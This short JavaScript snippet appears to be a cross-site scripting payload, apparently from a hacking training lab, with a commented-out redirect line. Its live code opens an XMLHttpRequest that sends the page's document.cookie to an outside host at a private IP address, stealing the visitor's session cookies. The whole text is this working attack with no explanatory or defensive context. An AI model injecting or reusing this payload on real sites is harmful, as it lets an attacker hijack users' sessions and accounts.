//window.location.href = "https://hack4u.io"
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.1.187/?cookie='+document.cookie);
request.send();
